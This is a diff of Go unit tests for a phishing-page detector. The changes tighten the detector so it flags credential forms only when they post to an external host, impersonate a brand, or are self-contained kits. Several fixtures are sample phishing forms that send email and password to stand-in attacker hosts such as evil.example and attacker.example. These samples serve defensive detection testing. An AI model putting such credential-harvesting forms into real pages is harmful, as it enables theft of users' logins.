@@ -276,10 +276,11 @@ func TestIsPhishingKitZipNoMatch(t *testing.T) {
 func TestQuickPhishingCheckPositive(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "login.html")
-	content := `<html><body><form><input type="email" name="email"></form></body></html>`
+	// Credential input + external form action = clear exfiltration shape.
+	content := `<html><body><form action="https://evil.example/collect"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
 	if !quickPhishingCheck(path) {
-		t.Error("form with email input should match")
+		t.Error("credential form posting external should match")
 	}
 }
 
@@ -645,8 +646,9 @@ func TestAnalyzeDirectoryStructurePhishingDrop(t *testing.T) {
 	dir := t.TempDir()
 	dropDir := filepath.Join(dir, "WashingtonGolf")
 	_ = os.MkdirAll(dropDir, 0700)
-	// One HTML file with credential form.
-	content := `<html><form><input type="email"><input type="password"></form></html>`
+	// One HTML file with credential form posting to external host (real
+	// kits exfiltrate to attacker-controlled domains).
+	content := `<html><body><form action="https://attacker.example/collect"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(filepath.Join(dropDir, "PalmerHamilton.html"), []byte(content), 0600)
 
 	res := analyzeDirectoryStructure(dropDir, "alice")
@@ -817,60 +819,75 @@ func TestScanForPhishingSkipsKnownSafeDir(t *testing.T) {
 	}
 }
 
-// --- hasTutorialAncestor (analyzeDirectoryStructure ancestor walk) -----
+// --- quickPhishingCheck content-shape requirements --------------------
 //
 // Real cluster6 false positive: a developer's tutorial dump at
 //   /home/echipamentefrig/birou.servicefrig.ro/temp/JavaScript Login/vers-1
-// fired phishing_directory because the immediate dir name "vers-1" is
-// generic and slipped past looksLikeBusinessName, even though the parent
-// "JavaScript Login" and grandparent "temp" clearly tag the contents as
-// developer snippets. The ancestor walk catches that case without
-// allowlisting paths.
+// shipped a login.html that posted to its own page, hardcoded fake
+// "user1/user2/user3" + "pass1/pass2/pass3" credentials in JavaScript,
+// and carried no brand impersonation. quickPhishingCheck used to flag
+// any HTML with `<form>` plus the words "email" or "password" -- which
+// matched every contact form, password-reset stub, and tutorial in
+// existence. The directory-anomaly heuristic propagated that as a
+// phishing_directory finding.
+//
+// Tightening: a credential-collection input is necessary but not
+// sufficient. The page must also exfiltrate (external form action),
+// look like a kit (self-contained inline-styled body), or impersonate
+// a known brand. None of those are true for the tutorial; all are
+// true for real phishing kits.
 
-func TestHasTutorialAncestor_TempDir(t *testing.T) {
-	if !hasTutorialAncestor("/home/u/birou.example.ro/temp/JavaScript Login/vers-1") {
-		t.Error("temp/JavaScript Login parent should mark dir as tutorial")
+func TestQuickPhishingCheckRejectsTutorialLogin(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "login.html")
+	// Shape mirrors temp/JavaScript Login/vers-1/login.html on cluster6:
+	// trivial credential form, no brand, no external action, no inline
+	// styling. Hardcoded fake creds in JS + comment about insecurity.
+	content := `<html><head></head><body>
+<script type="text/javascript">
+var unArray = ["user1","user2","user3"];
+var pwArray = ["pass1","pass2","pass3"];
+function validate() { /* hopelessly insecure -- do not use for anything serious */ }
+</script>
+<form name="myform">
+<p>ENTER USER NAME <input type="text" name="username">
+ENTER PASSWORD <input type="password" name="pword">
+<input type="button" value="Check In" onclick="validate()">
+</p>
+</form>
+</body></html>`
+	_ = os.WriteFile(path, []byte(content), 0600)
+	if quickPhishingCheck(path) {
+		t.Error("tutorial login (no brand, no external action, no inline styling) must not match")
 	}
 }
 
-func TestHasTutorialAncestor_TutorialParent(t *testing.T) {
-	if !hasTutorialAncestor("/home/u/public_html/tutorial/AcmeCorp") {
-		t.Error("tutorial parent should mark dir as tutorial")
+func TestQuickPhishingCheckAcceptsExternalFormAction(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "verify.html")
+	content := `<html><body><form action="https://attacker.example/collect.php"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
+	_ = os.WriteFile(path, []byte(content), 0600)
+	if !quickPhishingCheck(path) {
+		t.Error("credential form posting to external host must match")
 	}
 }
 
-func TestHasTutorialAncestor_JavascriptPrefixParent(t *testing.T) {
-	if !hasTutorialAncestor("/home/u/public_html/javascript-login/vers-1") {
-		t.Error("javascript-prefixed parent should mark dir as tutorial")
+func TestQuickPhishingCheckAcceptsBrandImpersonation(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "office.html")
+	content := `<html><head><title>Sign in to Office 365</title></head><body><form><input type="email" name="email"><input type="password" name="password"></form></body></html>`
+	_ = os.WriteFile(path, []byte(content), 0600)
+	if !quickPhishingCheck(path) {
+		t.Error("credential form on Office 365-titled page must match")
 	}
 }
 
-func TestHasTutorialAncestor_LegitDocRoot(t *testing.T) {
-	if hasTutorialAncestor("/home/u/public_html/AcmeCorp") {
-		t.Error("public_html/<business> has no tutorial ancestor")
-	}
-}
-
-func TestHasTutorialAncestor_DocRootSibling(t *testing.T) {
-	if hasTutorialAncestor("/home/u/birou.example.ro/AcmeCorp") {
-		t.Error("custom doc root with no scratch parents has no tutorial ancestor")
-	}
-}
-
-func TestHasTutorialAncestor_OutsideHome(t *testing.T) {
-	// Anything not under /home/ is out of scope (unit tests use t.TempDir()
-	// which is /tmp/ on Linux and /var/folders/ on Darwin).
-	if hasTutorialAncestor("/tmp/TestSomething/temp/AcmeCorp") {
-		t.Error("paths outside /home/ should not run ancestor check")
-	}
-	if hasTutorialAncestor("/var/folders/xx/yy/T/TestPhishing/AcmeCorp") {
-		t.Error("Darwin tmp path should not run ancestor check")
-	}
-}
-
-func TestHasTutorialAncestor_AtUserRoot(t *testing.T) {
-	// /home/u/ itself has no ancestor below /home/<user>/ to check.
-	if hasTutorialAncestor("/home/u/AcmeCorp") {
-		t.Error("dir directly under /home/<user>/ has no checkable ancestors")
+func TestQuickPhishingCheckAcceptsSelfContainedKit(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "kit.html")
+	content := `<html><head><style>body{font-family:Arial}</style></head><body><form><input type="email" name="email"><input type="password" name="password"></form></body></html>`
+	_ = os.WriteFile(path, []byte(content), 0600)
+	if !quickPhishingCheck(path) {
+		t.Error("self-contained inline-styled credential page must match")
 	}
 }
